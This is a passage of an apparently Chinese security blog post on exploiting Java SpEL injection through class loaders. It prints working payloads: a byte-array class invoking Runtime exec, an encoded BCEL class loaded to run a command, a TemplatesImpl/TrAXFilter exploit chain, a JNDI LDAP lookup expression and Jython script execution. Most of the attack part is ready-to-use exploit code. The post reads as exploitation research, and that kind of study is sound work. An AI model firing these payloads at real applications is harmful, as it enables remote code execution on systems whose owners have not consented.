class="number">47</span>,<span class="number">82</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">76</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">59</span>,<span class="number">41</span>,<span class="number">76</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">80</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">59</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">84</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">0</span>,<span class="number">33</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">42</span>,-<span class="number">73</span>,<span class="number">0</span>,<span class="number">1</span>,-<span class="number">79</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">17</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">97</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">18</span>,-<span class="number">72</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">3</span>,-<span class="number">74</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">87</span>,-<span class="number">89</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">75</span>,<span class="number">42</span>,-<span class="number">74</span>,<span class="number">0</span>,<span class="number">6</span>,-<span class="number">79</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">22</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">17</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">18</span>,<span class="number">0</span>,<span class="number">19</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">20</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">76</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">22</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>除此之外还有一些可用的点：</p>
+<p>比如jndi在高版本jdk下的利用点，有一个grovvy的利用点；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFdiDO"><img src="https://s1.ax1x.com/2022/04/10/LFdiDO.png" alt="LFdiDO.png"></a></p>
+<p>可以看到在构造函数中利用充载给其父加载器进行赋值；</p>
+<p>而在这个class下同样存在defineClass函数；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFdMKf"><img src="https://s1.ax1x.com/2022/04/10/LFdMKf.png" alt="LFdMKf.png"></a></p>
+<p>这里和之前那个一样，直接打就行；如果存在spel，这也是个不错的利用点；</p>
+<p>当然这个点也可用evaluate函数执行groovy脚本；</p>
+<h3 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h3><p>字节码操作相关类，这里举例BCEL(Byte Code Engineering Library)，是Java classworking最广泛使用的一种框架。它在实际的JVM指令层次上进行操作(BCEL拥有丰富的JVM 指令级支持)而Javassist所强调的源代码级别的工作。<br>JDK1.6开始引入自带的BCEL，BCEL的ClassLoader对于高版本的JDK也是在实际中非常好利用的一种。需要注意的是BCEL loadClass时候会有classpath的限制。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFwcTg"><img src="https://s1.ax1x.com/2022/04/10/LFwcTg.png" alt="LFwcTg.png"></a></p>
+<p>可以看到这个点也是符合之前的分析要求的；也说到这个是基于jvm指令进行操作的；所以利用点有一点别致：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.bcel.internal.util.ClassLoader.class.newInstance().loadClass(<span class="string">&quot;$BCEL$l$8b$I$A$A$A$A$A$A$A$8dT$ebR$dbF$U$fe$d6$96$bdB$88$9b$N$E$HB$93$5e$a8$J$60$e7$7e1$nmqI$9b$d6P$82$T$a8$a0m$o$e4$F$94$80$e4HrBf2$93$ff$7d$83$f4$Fx$D$3bSO$db$7f$f9$d1$t$e9S$d4$3d$x$e3$da4$ceL$3d$d6J$fb$ed$b9$7c$e7$b2$e7$cf$bf$7f$fd$j$c0$V$d8$g$3e$40V$c5$F$N$XqI$83$8a$cb$w$ae$c8$f7U$8ek$i$d7U$dcPqSEN$c5$bc$G$8e$5brY$d0p$h$9fq$7c$ae$e2$L$N$8b$c8k$Y$c4$97$iK$g$86q$87$e3$x$N$a3$c8$ca$cd$d7$f2$eb$ae$8ao8$be$95$9f$F$N$e3X$e6X$e1$f8$8e$n$7e$cbv$ec$e06$c3H$ba$f0$d8$7cff$f7Mg7$5b$M$3c$db$d9$9d$9f$5egP$f2nI0$M$UlG$acT$O$b6$85w$df$dc$de$t$a4$af$Y$98$d6$93e$b3$i$eeC$7b$d79V9$ee$R$x$oB$i$Y$b4$a5CK$94$D$dbu$7c$da$U$dd$8ag$89$3b$b6T$l$5c$f5$5cK$f8$fe$d2$a1$b02$d2$b3$8e$b3Xc$e0$ae$9fq$cc$D2X$d4q$l$Pt$acc$83$n$fa$dcvt$7c$P$83a$ac$cd$f3$d8$c6b$c5$de$_$J$8f$8c$fe7$E$86$88$bfG$cb$9cE$96$ad$83RF$i$92$efH$d6$92$de6ul$e1$H$8e$lu$fc$84$87$M$a9P$dbv$b3w$9dr$r$m$D$c2$3cX$Tfh9$ba$bb$fd$84$e3$91$O$T$dbR$97$ec$8d$b6$c4$X$x$3b$3b$c2$T$a5$a6$ac$3c$z$b5N$3b$a84$a5t$Il$e8$d8$BQc$gC$b2$z$f6o$aat$ecI$99$b38$c7$d0$db$91$s$wR$5b$3a$bfo$fa$7e$c1m$b2Kn$bd$5b$bc$96$ed$93$f1P$qiY$d6$ceL$bd$f0$DA$H$bd$bb$o$moe$e1$F$_$Y$a6$ba$f5C7$_$bd$81$5bp$9f$L$_o$fa$94$da$e1tW$n$d5r$9d$c0$b4e$X$8cw$g$ce$ef$99$5eQ$3c$ad$I$c7$S$f3$d3$9b$94$b6t$97P$q$e1$98$l$98$5e$m$fb$b4$d3$c1qv$c8$c3$d0$3b$mC$3fEt$o$f6S$z$e5$93I$99o5$95C$b8E$94$7c$R$84$d4$e8M$7d$b3$e3z$x$d4$91$M$99$f7$e7$a4$8b$sY$bd$94$ee$ea$ee$fd$w2$d2d$5b$a9$d9Q$n$aa$92fI$5eB$ba$b3f$b9$y$i$ea$b1$d9$ffU$a3f$e3$c9$o$En$T$c19L$d2$d0$91$3f$eaB$d9h$88$e0C$dal$o$8e$kB$8f$ce$d7$c0$94$85D$e4$N$a2$xso14W$85$92$88U$R$7f$8dXt$a1$OnL$bc$c6X$fc7$a8F4$d1S4$94$84V4b3$c5$p$8c$i$83$bd$S$d4C$b0$86$be$w$fa$ab$Y$c8$vu$M$g$v$r1$f4$G$89$g$92$b9X$j$c3F$wV$c3H$5e$c7$a8Q$c3$a9$ig95$V$afb$cc$c8$a9o$91L$f1$94ZE$wq$9a$96$8d$a3$c6_u$8c$h$v$5e$c5D$Ng$fe$m$aa$R$7cD$eb5$f4$d1$g$83B$B$c4i$3c$ea4$3e$t$u$94I$c8$a1$d1G$X$aa$l$3e$G$f0$92$a6$e4$x$q$f03$92$f8$85$86$e1$c7$a4$r$Qk$90$a0$c2$f1$J$c7$U$a3$Hh$90v$t$QQ1I$ff$G$86N$c0$d1$s$cc$f1i$83$86wO$fb$84$p$cd1$cdq$9ec$s4x$g$b3$e4J$a1l$8f$d33$X$S$cf$fc$D0$bd$y$da$E$G$A$A&quot;</span>).getConstructor(<span class="keyword">new</span> Class[]&#123;String.class&#125;).newInstance(<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;ifconfig&quot;</span>&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>也是一种攻击情况，可以在存在spel的地方进行尝试；</p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>​    这个利用点的由来还是在分析CC的时候比较常见，这个里面会对bytecode的字节数组直接进行defineClass的操作；所以也可从这个角度思考，能否在单向链中采用这个利用点呢？</p>
+<p>找了下class；发现TrAXFilter可以胜任；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFj6D1"><img src="https://s1.ax1x.com/2022/04/10/LFj6D1.png" alt="LFj6D1.png"></a></p>
+<p>看一下相关的逻辑，这里传入一个Templates类型的对象，然后就可直接在构造器里直接进行调用newTransformer函数；这个函数其实并不陌生；但是这里还是回顾一下调用链，可以到TemplatesImpl下看一下；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFviV0"><img src="https://s1.ax1x.com/2022/04/10/LFviV0.png" alt="LFviV0.png"></a></p>
+<p>可以清楚的看到这个点，触发了getTransletInstance方法；追过去看一下逻辑；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFvnM9"><img src="https://s1.ax1x.com/2022/04/10/LFvnM9.png" alt="LFvnM9.png"></a></p>
+<p>可以很清晰的看到对class进行了实例化的操作；向前有一个判断class是否为null的，追进去看看；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LFxMlQ"><img src="https://s1.ax1x.com/2022/04/10/LFxMlQ.png" alt="LFxMlQ.png"></a></p>
+<p>看到相关的逻辑，class就是从bytecode这个地方进行define的；所以逻辑很明确了；其实也还是原来的CC链的原理；</p>
+<p>给出exp；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CCexp cCexp = <span class="keyword">new</span> CCexp();</span><br><span class="line">Object getobject = cCexp.getObject();</span><br><span class="line">System.out.println(getobject);</span><br><span class="line">TrAXFilter.class.getConstructor(Templates.class).newInstance(getobject);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>转换成单向链条调用之后就为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(org.apache.xalan.xsltc.trax.TrAXFilter).getConstructor(Templates.class).newInstance(getobject)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Lk7Bb8"><img src="https://s1.ax1x.com/2022/04/10/Lk7Bb8.png" alt="Lk7Bb8.png"></a></p>
+<p>不过这个点相对比较的鸡肋一点；主要的问题就是如何生成恶意的obj然后传入的问题；不过如果可以控制的话倒是可以进行传入；</p>
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>老生常谈的话题了；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(javax.naming.InitialContext).newInstance().lookup(<span class="string">&quot;ldap://127.0.0.1:1389/s1mple_hack_it&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>不过问题就是在于是否可以出网；</p>
+<h3 id="其他引擎"><a href="#其他引擎" class="headerlink" title="其他引擎"></a>其他引擎</h3><p>当然上面提到了jsEngine；所以除这个之外，还有一些其他的引擎</p>
+<p>Jython</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">T(PythonInterpreter).newInstance().exec(<span class="string">&quot;from java.lang import Thread;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;stack=Thread.currentThread().getStackTrace();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;for i in range(0, len(stack)):\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;   print(stack[i])\n&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>具体问题结合具体的环境进行分析即可，根据调用不同的引擎也算是一种思路；</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="/2022/03/26/%E4%B8%80%E4%B8%AAjava-oa%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1/" style="float: left;">
+        ← 一个java-oa简单审计
+    </a>
+    
+    
+    <a class="pull-right" href="/2022/03/14/java-JNDI%E6%B3%A8%E5%85%A5%E5%BA%95%E5%B1%82%E5%88%86%E6%9E%90/">
+        java JNDI注入底层分析 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
